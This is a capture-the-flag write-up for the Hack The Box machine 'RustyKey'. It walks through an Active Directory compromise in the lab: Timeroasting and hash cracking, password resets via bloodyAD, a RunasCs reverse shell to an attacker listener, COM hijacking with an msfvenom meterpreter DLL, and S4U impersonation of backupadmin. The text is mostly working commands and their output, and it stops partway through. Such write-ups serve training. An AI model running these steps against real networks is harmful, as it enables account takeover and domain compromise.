---
layout: post
title: "[HTB] RustyKey"
description: "[Machine] - Hard difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Hard
---
![](/img/htb_img/RustyKey_img/img1.png)

- OS: Windows
- Release Date: 28 Jun 2025
- Difficulty: Hard

<br>
# Info

Credentials → rr.parker → 8#t5HE8L!W3A

# Enumeration

We start by identifying the operating system of the target machine.
```bash
❯ ping -c 1 $target              
PING 10.129.xx.xx (10.129.xx.xx) 56(84) bytes of data.
64 bytes from 10.129.xx.xx: icmp_seq=1 ttl=127 time=45.7 ms

--- 10.129.xx.xx ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.683/45.683/45.683/0.000 ms
```

By analyzing the TTL (Time To Live) value of 127, we can determine that we are dealing with a Windows machine.

We start by scanning the target with nmap, first performing a port scan to identify open ports, and then running service and version detection on those ports.

```bash
❯ sudo nmap -p- --open --min-rate 5000 -T4 -sS -n -Pn -vvv -oG allports $target

Completed SYN Stealth Scan at 12:31, 12.17s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.041s latency).
Scanned at 2025-06-29 12:31:41 CEST for 12s
Not shown: 65349 closed tcp ports (reset), 160 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49672/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49739/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
           Raw packets sent: 70606 (3.107MB) | Rcvd: 65542 (2.622MB)
```

```bash
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49672,49673,49676,49692,49739 -sCV -Pn -oN targeted $target     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:44 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-29 18:44:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-29T18:45:24
|_  start_date: N/A
|_clock-skew: 8h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.85 seconds
```

The scan results reveal that this is a Domain Controller (DC). We need to add the domain name and FQDN to our `/etc/hosts` file for proper hostname resolution:

```bash
❯ echo "$target rustykey.htb dc.rustykey.htb" | sudo tee -a /etc/hosts
10.129.xx.xx rustykey.htb dc.rustykey.htb
```

---

## Kerberos Clock Synchronization

Since we are dealing with Kerberos authentication, we need to synchronize our system clock with the domain controller. Kerberos is very sensitive to time differences, and authentication will fail if the clocks are too far apart (typically more than 5 minutes).

```bash
❯ sudo timedatectl set-ntp 0

❯ sudo ntpdate $target                                                         
2025-06-29 20:47:56.031738 (+0200) +28800.856183 +/- 0.020676 10.129.xx.xx s1 no-leap
CLOCK: time stepped by 28800.856183
```

---

## SMB Enumeration

We attempt to enumerate SMB shares using the provided credentials, but the connection fails with `STATUS_NOT_SUPPORTED`. This error typically indicates that the authentication method being used is not supported by the server, or there may be restrictions on the account.

```bash
❯ nxc smb rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A'                                                                                                                    
SMB         10.129.xx.xx     445    10.129.xx.xx      [*]  x64 (name:10.129.xx.xx) (domain:10.129.xx.xx) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.xx.xx     445    10.129.xx.xx      [-] 10.129.xx.xx\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED 
```

The same error occurs when attempting to connect with `smbclient`.

```bash
❯ smbclient -N -L //rustykey.htb   
session setup failed: NT_STATUS_NOT_SUPPORTED
```

---

## LDAP Enumeration

Since SMB enumeration failed, we turn to LDAP enumeration. Using `ldapsearch`, we perform user enumeration by querying for objects with `objectClass=user` and retrieving their `userPrincipalName` attributes.

```bash
❯ ldapsearch -x -H ldap://$target -D 'rr.parker@rustykey.htb' -w '8#t5HE8L!W3A' -b 'dc=rustykey,dc=htb' "(objectClass=user)" userPrincipalName | tee ldap_users.txt
```

The LDAP search results can be quite verbose and overwhelming. We filter the output to extract only the usernames for easier analysis.

```bash
❯ cat ldap_users.txt | grep \# | grep Users | cut -d',' -f1 | sed 's/# //' | tee users.txt

Administrator
Guest
krbtgt
rr.parker
mm.turner
bb.morgan
gg.anderson
dd.ali
ee.reed
nn.marcos
backupadmin
```

---

## Bloodhound

When working with Active Directory environments, BloodHound is one of the most powerful tools for mapping attack paths and understanding the domain structure. We first obtain a TGT (Ticket Granting Ticket) for the user `rr.parker` and then run BloodHound to collect and analyze the domain relationships.

```bash
❯ impacket-getTGT -dc-ip $target rustykey.htb/rr.parker:'8#t5HE8L!W3A'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache
```

```bash
❯ export KRB5CCNAME=rr.parker.ccache

❯ klist
Ticket cache: FILE:rr.parker.ccache
Default principal: rr.parker@RUSTYKEY.HTB

Valid starting       Expires              Service principal
06/29/2025 21:35:33  06/30/2025 07:35:33  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
	renew until 06/30/2025 21:31:00
```

Now we run BloodHound to collect domain data:

```bash
❯ bloodhound-python -u 'rr.parker' -p '8#t5HEL!W3A' -c All -d rustykey.htb -ns $target -k
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 08S
```

After importing the data into the BloodHound GUI, we begin exploring the attack paths.

![img2.png](/img/htb_img/RustyKey_img/img2.png)

### Timeroast Attack (Python Script)

We will perform a Timeroasting attack. Timeroasting is a technique that exploits Windows' NTP (Network Time Protocol) authentication mechanism to extract password hashes from computer accounts.

[https://github.com/SecuraBV/Timeroast.git](https://github.com/SecuraBV/Timeroast.git)

Timeroasting exploits the Windows NTP authentication mechanism. This allows unauthenticated attackers to request and obtain a password hash for any computer or trust account by sending an NTP request using the account's RID. Normally, this is not an issue if computer account passwords are randomly and securely generated. However, if weak, non-standard, or legacy default passwords are set, this technique enables offline brute-forcing.

The Timeroast toolkit comes with three different scripts.

The first script, timeroast.py, takes a domain controller's domain name or IP address and will attempt to collect 'NTP hashes' from computer and trust accounts in the domain by enumerating RIDs.

```bash
❯ python3 timeroast.py $target -o rustykey.hashes

❯ python3 extra-scripts/timecrack.py rustykey.hashes /usr/share/wordlists/rockyou.txt
Traceback (most recent call last):
  File "/home/kali/HTB/Machines/RustyKey/exploits/Timeroast/extra-scripts/timecrack.py", line 71, in <module>
    main()
    ~~~~^^
  File "/home/kali/HTB/Machines/RustyKey/exploits/Timeroast/extra-scripts/timecrack.py", line 64, in main
    for rid, password in try_crack(args.hashes, args.dictionary):
                         ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/HTB/Machines/RustyKey/exploits/Timeroast/extra-scripts/timecrack.py", line 44, in try_crack
    for password in dictfile:
                    ^^^^^^^^
  File "<frozen codecs>", line 325, in decode
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
```

The script had a UnicodeDecodeError when reading the wordlist file because some passwords in rockyou.txt (and similar lists) aren’t valid UTF-8. To fix this, we need to open the wordlist file with a more tolerant encoding and make a few adjustments to the script.

**Here’s how you fix it:**

1. **Change the function signature:**  
   Originally, the function looked like this:
   ```python
   def try_crack(hashfile : TextIO, dictfile : TextIO) -> Generator[Tuple[int, str], None, None]:
   ```
   Change it to:
   ```python
   def try_crack(hashfile : TextIO, dictpath : str) -> Generator[Tuple[int, str], None, None]:
   ```
   Now, instead of passing an open file for the dictionary, you pass the path as a string. This gives us full control over how to open the file (with any encoding we want).

2. **Open the dictionary file using 'latin-1' encoding inside the function:**  
   Replace:
   ```python
   for password in dictfile:
       password = password.strip()
       # ...
   ```
   with:
   ```python
   with open(dictpath, 'r', encoding='latin-1') as dictfile:
       for password in dictfile:
           password = password.strip()
           # ...
   ```
   This ensures the script can read even “broken” encodings in the wordlist without crashing.

3. **Update the argument parser:**  
   Change this line:
   ```python
   argparser.add_argument('dictionary', type=FileType('r'), help='Line-delimited password dictionary')
   ```
   to:
   ```python
   argparser.add_argument('dictionary', type=str, help='Line-delimited password dictionary')
   ```
   Now argparse just passes a string (the file path), not an open file. This matches the new function parameter and allows you to open the file as needed inside the function.

**In summary:**  
Instead of letting argparse open your wordlist file and risking encoding issues, you handle opening it yourself with `encoding='latin-1'` inside the script. This makes the script much more robust for big international wordlists.

Example of what to change:
```python
# BEFORE
def try_crack(hashfile : TextIO, dictfile : TextIO):
    for password in dictfile:
        password = password.strip()
        # (rest of logic)

# AFTER
def try_crack(hashfile : TextIO, dictpath : str):
    with open(dictpath, 'r', encoding='latin-1') as dictfile:
        for password in dictfile:
            password = password.strip()
            # (rest of logic)
```
And update argparse to use `type=str` for the password dictionary argument.


```bash
❯ python3 timecrack_fixed.py rustykey.hashes /usr/share/wordlists/rockyou.txt

[+] Cracked RID 1125 password: Rusty88!
```

The fix worked successfully, and we have cracked the password for RID 1125: `Rusty88!`.

If we don't know which machine this RID corresponds to, we can search for it in BloodHound to identify the computer account.

![image.png](/img/htb_img/RustyKey_img/img3.png)

![image.png](/img/htb_img/RustyKey_img/img4.png)

Now that we have the password for this machine account, we can continue with the exploit chain.

### Timeroast Attack (Netexec Alternative)

The use of the Python scripts is not completely necessary, as `netexec` (formerly CrackMapExec) also supports Timeroasting directly through SMB:

```bash
❯ nxc smb 10.129.xx.xx -M timeroast
SMB         10.129.xx.xx     445    10.129.xx.xx      [*]  x64 (name:10.129.xx.xx) (domain:10.129.xx.xx) (signing:True) (SMBv1:False) (NTLM:False)
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      [*] Starting Timeroasting...
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1000:$sntp-ms$4933578eae052417fea9543afe3fe7b9$1c0111e900000000000a766c4c4f434cec0b7f29a92f463ee1b8428bffbfcd0aec0c1b490d47bb80ec0c1b490d47e71f
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1103:$sntp-ms$6866665bf3e62619401eea65944442ef$1c0111e900000000000a766c4c4f434cec0b7f29a874b182e1b8428bffbfcd0aec0c1b49bc6c3837ec0c1b49bc6c9986
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1104:$sntp-ms$a41dd70d14d6e0193e577ac453002e46$1c0111e900000000000a766c4c4f434cec0b7f29a8814a17e1b8428bffbfcd0aec0c1b49c0916440ec0c1b49c091c58f
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1105:$sntp-ms$71c164ede48bd25bdff0841e78627a57$1c0111e900000000000a766c4c4f434cec0b7f29a8af44fce1b8428bffbfcd0aec0c1b49c0bf8261ec0c1b49c0bfc074
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1106:$sntp-ms$19988b47a4c460556da404b47b9ae13d$1c0111e900000000000a766c4c4f434cec0b7f29a777bb22e1b8428bffbfcd0aec0c1b49c35ef8b3ec0c1b49c35f3874
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1107:$sntp-ms$65e9d919f02b9530b9291d8ccd5e42d0$1c0111e900000000000a766c4c4f434cec0b7f29a7aa5b88e1b8428bffbfcd0aec0c1b49c391ab8eec0c1b49c391d8da
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1118:$sntp-ms$4190d7ab8ed1302223b6b9685292151f$1c0111e900000000000a766c4c4f434cec0b7f29a9c8fee1e1b8428bffbfcd0aec0c1b49d1b85cd3ec0c1b49d1b8b5be
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1119:$sntp-ms$eeeb82db8a61da67a2ca39df3c8dd498$1c0111e900000000000a766c4c4f434cec0b7f29a7850085e1b8428bffbfcd0aec0c1b49d38d060dec0c1b49d38d4273
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1120:$sntp-ms$dfaa02672acd07137c558273fb6e4882$1c0111e900000000000a766c4c4f434cec0b7f29a8f78e41e1b8428bffbfcd0aec0c1b49d4ff8ec0ec0c1b49d4ffd38a
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1121:$sntp-ms$b531849509dc651196434fa7fd71e203$1c0111e900000000000a766c4c4f434cec0b7f29aa913daae1b8428bffbfcd0aec0c1b49d6992a08ec0c1b49d699864e
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1122:$sntp-ms$dcb391569a58eb2334a5619730fda97e$1c0111e900000000000a766c4c4f434cec0b7f29a8641e8de1b8428bffbfcd0aec0c1b49d884b78aec0c1b49d884f74b
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1124:$sntp-ms$736e27616c451cc30e4be64b637cf0d7$1c0111e900000000000a766c4c4f434cec0b7f29a8967bd7e1b8428bffbfcd0aec0c1b49dc8e3186ec0c1b49dc8e581c
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1123:$sntp-ms$f3edfefcc3858c33c7d1e57151efe4fd$1c0111e900000000000a766c4c4f434cec0b7f29a889514ce1b8428bffbfcd0aec0c1b49dc80e212ec0c1b49dc813950
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1125:$sntp-ms$51b9891082e9c765056328506033dc95$1c0111e900000000000a766c4c4f434cec0b7f29a7e5aaeae1b8428bffbfcd0aec0c1b49dff5d935ec0c1b49dff61dfe
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1126:$sntp-ms$0c836b6628a0cfd020e1368f1891e02f$1c0111e900000000000a766c4c4f434cec0b7f29a818ba0be1b8428bffbfcd0aec0c1b49e029032eec0c1b49e02929c4
TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1127:$sntp-ms$5bee234c8817409d5b92048d53347362$1c0111e900000000000a766c4c4f434cec0b7f29a83335b7e1b8428bffbfcd0aec0c1b49e04383e3ec0c1b49e043a571
```

We can extract those hashes by grepping the output and then crack them offline to identify which RID corresponds to which password.

---

<br>
<br>

# Foothold

We will perform an attack chain starting from the IT-COMPUTER3$ machine account that we compromised through Timeroasting.

First, let's understand what we need to do by analyzing the BloodHound data:

![image.png](/img/htb_img/RustyKey_img/img5.png)

The IT-COMPUTER3$ machine account has the ability to add itself to the HELPDESK group, which is an important step that brings us closer to domain compromise.

```bash
❯ impacket-getTGT -dc-ip 10.129.xx.xx 'rustykey.htb/IT-COMPUTER3$:Rusty88!'                                                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-COMPUTER3$.ccache
```

```bash
❯ export KRB5CCNAME=IT-COMPUTER3\$.ccache

❯ klist
Ticket cache: FILE:IT-COMPUTER3$.ccache
Default principal: IT-COMPUTER3$@RUSTYKEY.HTB

Valid starting       Expires              Service principal
06/29/2025 22:12:04  06/30/2025 08:12:04  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
	renew until 06/30/2025 22:09:04
```

After obtaining the TGT, we use `bloodyAD` to add the IT-COMPUTER3$ machine account to the HELPDESK group.

```bash
❯ bloodyAD --host dc.rustykey.htb --dc-ip $target -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$
[+] IT-COMPUTER3$ added to HELPDESK
```

![image.png](/img/htb_img/RustyKey_img/img6.png)

The IT group is assigned as a protected object, which prevents certain modifications. However, with our current privileges, we can remove it from the Protected Objects group.

```bash
❯ bloodyAD --host dc.rustykey.htb -k -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'
[-] IT removed from Protected Objects
```

After removing IT from Protected Objects, we now have the ability to change `bb.morgan`'s password:

```bash
❯ bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Password123!'
[+] Password changed successfully!
```

Now we have control of the user `bb.morgan` with the password `Password123!`.

Since this machine resets periodically, it's useful to have all the bloodyAD commands in a convenient format so we can quickly replicate the attack chain when needed:

```bash
❯ bloodyAD --host dc.rustykey.htb --dc-ip $target -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$

❯ bloodyAD --host dc.rustykey.htb -k -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'

❯ bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Password123!'
```

---

## Getting a Shell with bb.morgan

First, we obtain a TGT (Ticket Granting Ticket) for the `bb.morgan` user.

```bash
❯ impacket-getTGT -dc-ip 10.129.xx.xx 'rustykey.htb/bb.morgan:Password123!' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
```

```bash
❯ export KRB5CCNAME=bb.morgan.ccache

❯ klist
Ticket cache: FILE:bb.morgan.ccache
Default principal: bb.morgan@RUSTYKEY.HTB

Valid starting       Expires              Service principal
06/29/2025 22:22:18  06/30/2025 08:22:18  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
	renew until 06/30/2025 22:18:17
```

### Shell

```bash
❯ evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
```

## User Flag

Inside the `bb.morgan` user directories, we can find the `user.txt` flag and a PDF file. We download the PDF and inspect it on our attacker machine to gather additional information.

```bash
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> dir

    Directory: C:\Users\bb.morgan\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---        6/29/2025   2:01 AM             34 user.txt

*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> 

*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> download internal.pdf
                                        
Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> 
```

![image.png](/img/htb_img/RustyKey_img/img7.png)

The PDF message indicates that the Support group has been granted additional permissions. We can examine this group in our BloodHound graph to understand the attack path.

![image.png](/img/htb_img/RustyKey_img/img8.png)

We will attempt to compromise the user `ee.reed` as well, following a similar attack chain.

<br>
# Lateral Movement

## EE.REED

Previous steps if needed (machine resets)

```bash
❯ export KRB5CCNAME=IT-COMPUTER3\$.ccache

❯ klist
Ticket cache: FILE:IT-COMPUTER3$.ccache
Default principal: IT-COMPUTER3$@RUSTYKEY.HTB

Valid starting       Expires              Service principal
06/29/2025 22:12:04  06/30/2025 08:12:04  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
	renew until 06/30/2025 22:09:04
```

```bash
❯ bloodyAD --host dc.rustykey.htb --dc-ip 10.129.xx.xx -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$
[+] IT-COMPUTER3$ added to HELPDESK
```

Similar to the IT group, the SUPPORT group is also in the Protected Objects group, which we need to remove:

```bash
❯ bloodyAD --kerberos --dc-ip 10.129.xx.xx --host dc.rustykey.htb -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" "SUPPORT"
[-] SUPPORT removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB
```

Now we set a new password for `ee.reed`:

```bash
❯ bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Password123!'                 
[+] Password changed successfully!
```

We obtain a Kerberos ticket for `ee.reed`:

```bash
❯ impacket-getTGT -dc-ip 10.129.xx.xx 'rustykey.htb/ee.reed:Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache

❯ export KRB5CCNAME=ee.reed.ccache

❯ klist
Ticket cache: FILE:ee.reed.ccache
Default principal: ee.reed@RUSTYKEY.HTB

Valid starting       Expires              Service principal
06/29/2025 22:34:52  06/30/2025 08:34:52  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
	renew until 06/30/2025 22:34:37
```

However, when we attempt to connect via WinRM with this user, the connection fails due to a memory allocation error:

```bash
❯ evil-winrm -i dc.rustykey.htb -u ee.reed -r rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success

                                        
Error: Exiting with code 1
malloc_consolidate(): unaligned fastbin chunk detected
[1]    39609 IOT instruction  evil-winrm -i dc.rustykey.htb -u ee.reed -r rustykey.htb
```

Since direct WinRM connection fails, we will pivot from the `bb.morgan` shell to `ee.reed` using RunasCs.exe, which allows us to execute commands as a different user.

### RunasCs.exe

We upload RunasCs.exe to a folder of our choice and execute it with `ee.reed`'s credentials, connecting to a local listener to obtain a shell as that user.

```bash
*Evil-WinRM* PS C:\Temp> .\RunasCs.exe ee.reed Password123! cmd.exe -r 10.10.14.xx:4444
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3d470b3$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 6136 created in background.
*Evil-WinRM* PS C:\Temp> 
```

We successfully obtain a reverse shell as `ee.reed`:

```bash
❯ nc -lvnp 4444       
listening on [any] 4444 ...
connect to [10.10.14.xx] from (UNKNOWN) [10.129.xx.xx] 58920
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
rustykey\ee.reed
```

---

## COM Hijacking

After investigating the system, we discover a potential COM (Component Object Model) Hijacking vulnerability. COM Hijacking occurs when a COM object is referenced but the expected DLL is missing or inaccessible, allowing an attacker to place a malicious DLL in the expected location.

To identify vulnerable CLSIDs, we upload Process Monitor (procmon.exe) and run it for approximately 3 minutes to capture registry access patterns. We then export the data to CSV and analyze it to find CLSIDs that are accessed but not found.

Alternatively, `accesschk64` from Sysinternals can also be used to identify COM hijacking opportunities.

```bash
Start-Process -FilePath "C:\Temp\procmon.exe" -ArgumentList "/Quiet /AcceptEula /BackingFile C:\Temp\capture.pml /Run180"

C:\Temp\procmon.exe /OpenLog C:\Temp\capture.pml /SaveAs C:\Temp\capture.csv

❯ grep -i "RegOpenKey" capture.csv | grep -i "NAME NOT FOUND" | grep -i "HKCU\\Software\\Classes\\CLSID" | grep -i "InprocServer32"

```

After identifying a vulnerable CLSID, we prepare our malicious payload using msfvenom:

```bash
❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.xx LPORT=5555 -f dll -o rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: rev.dll
```

This time we use a Metasploit listener to handle the Meterpreter session, which provides more advanced post-exploitation capabilities than a standard reverse shell.

We upload the malicious DLL to the target machine:

```bash
*Evil-WinRM* PS C:\Temp> upload rev.dll
                                        
Info: Uploading rev.dll to C:\Temp\rev.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Temp> 
```

From the `ee.reed` shell, we perform registry manipulation to point the COM object to our malicious DLL:

```bash
PS C:\Temp> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Temp\rev.dll" /f
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Temp\rev.dll" /f
The operation completed successfully.
```

We successfully obtain a Meterpreter session. From this session, we can launch PowerShell and configure unconstrained delegation on the computer account, which will allow us to impersonate any user that authenticates to this machine.

```bash
meterpreter > shell
Process 10872 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```

![image.png](/img/htb_img/RustyKey_img/img9.png)

---

<br>

# Privilege Escalation

## Impersonating the Domain Admin Account (S4U2)

We use the S4U2Self and S4U2Proxy (Service for User) extensions to impersonate the `backupadmin` account, which has domain administrator privileges. This attack leverages unconstrained delegation that we configured earlier.

```bash
❯ impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.129.xx.xx -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

```bash
